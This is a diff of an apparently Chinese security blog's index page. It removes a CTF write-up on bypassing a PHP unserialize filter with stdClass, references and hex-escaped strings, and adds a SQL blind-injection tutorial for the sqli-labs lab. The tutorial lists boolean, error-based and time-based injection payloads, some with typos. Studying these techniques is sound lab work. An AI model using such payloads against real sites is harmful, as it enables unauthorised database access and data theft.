@@ -169,81 +169,6 @@
 </nav>
       <div class="body-wrap">
   
-    <article id="post-nuctf[just serialize]内置类和php引用" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/nuctf%5Bjust%20serialize%5D%E5%86%85%E7%BD%AE%E7%B1%BB%E5%92%8Cphp%E5%BC%95%E7%94%A8/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/nuctf%5Bjust%20serialize%5D%E5%86%85%E7%BD%AE%E7%B1%BB%E5%92%8Cphp%E5%BC%95%E7%94%A8/">
-        nuctf[just serialize]内置类和php引用
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="内置类stdClass的使用及php引用及unserialize的特性"><a href="#内置类stdClass的使用及php引用及unserialize的特性" class="headerlink" title="内置类stdClass的使用及php引用及unserialize的特性"></a>内置类stdClass的使用及php引用及unserialize的特性</h1><h2 id="内置类stdClass"><a href="#内置类stdClass" class="headerlink" title="内置类stdClass"></a>内置类stdClass</h2><p>stdClass类是php的内置类，是所有php类都继承这个类，所以stdClass类随时都可以被new，但是stdClass类里面没有方法。</p>
-<p>代码例子</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a=new stdClass();</span><br><span class="line">$a-&gt;name=&quot;xc&quot;;</span><br><span class="line">echo (serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>注意的是当stdClass内置类反序列化时，由于stdClass内置类不能用echo来返回字符串，所以需要用print_r或var_dump()输出数组的形式才可以反序列化成功</p>
-<h2 id="php引用"><a href="#php引用" class="headerlink" title="php引用"></a>php引用</h2><p>在序列化中添加一个类的属性为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:1:&quot;f&quot;;R:2;</span><br></pre></td></tr></table></figure>
-<p>f这个变量可以继承前面属性的值，输入O:8:”stdClass”:2:{s:4:”flag”;S:4:”flag”;s:1:”f”;R:2;}，例子：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$obj=$_GET[&#x27;obj&#x27;];</span><br><span class="line">$obj=unserialize($obj);</span><br><span class="line">print_r($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>从输出结果可以看出f变量继承了前面第一个类的属性flag的值，而如果想继承前面第二个类的属性的值，则将R:2;改为R:3;即可，以此类推</p>
-<h2 id="unserialize的一个特性"><a href="#unserialize的一个特性" class="headerlink" title="unserialize的一个特性"></a>unserialize的一个特性</h2><p>如果反序列化中的类中的代表字符串的s符号改为大写的字符S的话，就可以识别十六进制的内容，例子：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$obj=$_GET[&#x27;obj&#x27;];</span><br><span class="line">if(preg_match(&#x27;/flag/i&#x27;,$obj))&#123;</span><br><span class="line"></span><br><span class="line">echo &quot;你错了&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;你爱我&quot;;</span><br><span class="line">print_r(unserialize($obj));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>此时可以通过用\66\6c\61\67代替flag进行绕过</p>
-<h2 id="nuctf中的just-serialzie实例"><a href="#nuctf中的just-serialzie实例" class="headerlink" title="nuctf中的just serialzie实例"></a>nuctf中的just serialzie实例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$obj=$_GET[&#x27;obj&#x27;];</span><br><span class="line">if(preg_match(&#x27;/flag/i&#x27;,$obj))&#123;</span><br><span class="line">die(&quot;?&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$obj=@unserialize($obj);</span><br><span class="line">if($obj-&gt;flag===&quot;flag&quot;)&#123;</span><br><span class="line">$obj-&gt;flag=$flag;</span><br><span class="line">&#125;</span><br><span class="line">foreach($obj as $k=&gt;$v)&#123;</span><br><span class="line">if($k!=&quot;flag&quot;)&#123;</span><br><span class="line">echo $v;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以通过使用stdClass内置类构造paylaod，且在flag属性上，将s改为大写S，从而使用十六进制对preg_match()正则过滤进行绕过，由于</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach($obj as $k=&gt;$v)&#123;</span><br><span class="line">if($k!=&quot;flag&quot;)&#123;</span><br><span class="line">echo $v;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>对类中的flag属性进行过滤，所以需要用到php引用来绕过，因此可以构造s:1:”f”;R:2;来继承flag属性的值，从而让代码echo出来</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
     <article id="post-http头部基础" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1025,6 +950,105 @@ echo strcmp($_GET['ret'],'wer');
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-sql盲注" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/sql%E7%9B%B2%E6%B3%A8/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/sql%E7%9B%B2%E6%B3%A8/">
+        sql盲注
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL注入的基础"><a href="#SQL注入的基础" class="headerlink" title="SQL注入的基础"></a>SQL注入的基础</h1><p>1.当在浏览器输入id值时，sql的语句会变成select …..from users where id=……LIMIT0,1<br>例：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-1/?id=1%E4%BC%9A%E8%87%AA%E5%8A%A8%E8%BD%AC%E5%8C%96%E4%B8%BAselect">http://127.0.0.1/sqli-labs/Less-1/?id=1会自动转化为select</a> ….from users where id=’1’ LIMIT0,1<br>注意：（1）–+或#起注释作用，会将后面的所有语句删除掉<br>      （2）union的作用连接sql语句，若前一条语句为空，则显示后面语句，反之，则<br>           示前面一条语句<br>      （3）注入类型：id=’$id‘  id=$id   id=(‘$id’)   id=(“$id”)……<br>           闭合中的数字后面跟与类型无关的字符，将默认转换为前面的数字</p>
+<h1 id="sql布尔盲注"><a href="#sql布尔盲注" class="headerlink" title="sql布尔盲注"></a>sql布尔盲注</h1><h2 id="基本使用函数"><a href="#基本使用函数" class="headerlink" title="基本使用函数"></a>基本使用函数</h2><ol>
+<li>Mid（）函数<br>此函数为截取字符串一部分，使用形式：Mid(column_name,start[,length])</li>
+<li>substr()函数<br>Substr()和substring()函数实现的功能是一样的，均为截取字符串。使用形式如下：<br>string substring(string, start, length)<br>string substr(string, start, length)<br>注意：参数描述同mid()函数，string为第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</li>
+<li>Left()函数<br>Left()得到字符串左部指定个数的字符，使用形式：Left ( string, n )<br>string为要截取的字符串，n为长度</li>
+<li>ORD（）函数，此函数为返回的第一个字符串的ascii码<br>如：ORD(MID(DATABASE(),1,1))&gt;114意为检测database（）第一位ascii码<br>否大于114，也即是“r”</li>
+<li>ascii()函数<br>将某个字符转换为ascii码，与ORD函数相似</li>
+<li>regexp 正则注入<br>正则注入介绍：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5717442.html">http://www.cnblogs.com/lcamry/articles/5717442.html</a><br>用法介绍：select user() regexp ‘^[a-z]’;<br>Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。<br>第二位可以用 select user() regexp ‘^ro’来进行。</li>
+<li>like匹配注入<br>和regexp正则注入类似，mysql注入的时候我们可以用like进行匹配<br>用法：select user() like ‘ro%’</li>
+<li>sleep()函数<br>将程序挂起一段时间 ，n为n秒</li>
+<li>if（）语句<br> 判断语句，如果第一个语句正确就执行第二个语句，如果错误就执行第三个语句</li>
+<li>length(string)<br>字符串的长度，string为要处理的字符串</li>
+<li>database()是数据库，table()是数据表</li>
+<li>CAST(str AS 目标数据类型）<pre><code>    将目标str转化为目标数据类型
+</code></pre>
+</li>
+<li>IFNULL(expr1,expr2)<pre><code>    如果expr1不是null,IFNULL()返回expr1,否则它返回的是expr2，且0x20为空
+</code></pre>
+</li>
+</ol>
+<h2 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h2><ol>
+<li>先爆数据库，如：<br>?id=1’and length(database()) –+    看当前数据库的长度<br>?id=1’and left(database(),1) –+    看当前数据库第一个首字母</li>
+<li>再爆数据表，如：<br>?id=1’and ascii(substr((select table_name for information_schema.tables where tables_schema=database() LIMIT    0,1),1,1))=(&lt;或&gt;)113 –+<br>以此类推，得出所有表</li>
+<li>再判断表中的列名是否有….列,如：<br>?Id=1’and 1=(select 1 from information_schema.columns where table_name=’users’and column_name regexp   ‘^username’LIMIT 0,1) –+</li>
+<li>看表中的列的内容，如；<br>?Id=1’and ORD(MID((select IFNULL(CAST(username AS CHAR),0x20）form security.users order by ip LIMIT       0,1),1,1))=68 –+<br>_</li>
+</ol>
+<h1 id="基于报错的sql盲注"><a href="#基于报错的sql盲注" class="headerlink" title="基于报错的sql盲注"></a>基于报错的sql盲注</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Count----------------------用于计数</span><br><span class="line">Floor----------------------取得0或1，进行数据的重复</span><br><span class="line">Group by-------------------对相同数据进行分组（相同的一组）</span><br><span class="line">Rand()---------------------一个随机函数，但使用一个固定的随机数种子0后，成为固定的伪随机序列</span><br><span class="line">extractvalue（1，路径）-------------如果路径格式不正确，就会返回报错信息，如果此时输入恶意代码，则返回想要的数据</span><br><span class="line">updatexml(1,路径,1)-----------------如果路径的格式不正确，就会返回报错信息，如果此时输入恶意代码，则返回想要的数据</span><br><span class="line">exp()--------------如果里面的数据超过720，则会有溢出，并返回想要的信息</span><br></pre></td></tr></table></figure>
+
+<h2 id="报错类型"><a href="#报错类型" class="headerlink" title="报错类型"></a>报错类型</h2><ol>
+<li>平常报错注入<br>  ?id=1’union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,floor(rand(0)*2))a form      information_schema.columns group by a–+</li>
+<li>利用double数值类型超出范围进行报错注入<br>  ?Id=1’union select (exp(~(select * from(select user())a))),2,3 –+</li>
+<li>利用bigint溢出进行报错注入<br>  ?Id=1’union select (!(select * from(select user())x) - ~0),2,3 –+</li>
+<li>xpath函数报错注入<br>  ?Id=1’and extractvalue(1,concat(0x7e,(select @@version),0x7e)) –+<br>  ?Id=1’and updatexml(1,concat(0x7e,(select @@verson),0x7e),1) –+</li>
+<li>利用数据重复性报错注入<br>  ?Id=1’union select 1,2,3 from (select NAME CONST(version(),1),NAME CONST(version(),1))x –+</li>
+</ol>
+<h1 id="基于时间的sql盲注"><a href="#基于时间的sql盲注" class="headerlink" title="基于时间的sql盲注"></a>基于时间的sql盲注</h1><h2 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Sleep(N)-------------可以让语句运行N秒</span><br><span class="line">Benchmark()-----------一个mysql的内置函数，主要用来测试一些函数执行速度，且带有两个参数，一个为执行次数，一个是执行函数或表达式</span><br></pre></td></tr></table></figure>
+
+<h2 id="延时注入类型"><a href="#延时注入类型" class="headerlink" title="延时注入类型"></a>延时注入类型</h2><ol>
+<li>利用sleep()函数进行注入<br>?Id=1’and if(ascii(substr(database(),1,1))=115,1,sleep(5)) –+</li>
+<li>利用benchmark()进行延时注入<br>?Id=1’union select (if(subsring(current,1,1)=char(115),benchmark(50000,encode(‘MSG’,’by 5      seconds       ’)),null)),2,3 from(select database() as current) as tb1 –+</li>
+</ol>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
 	</div>
 
       
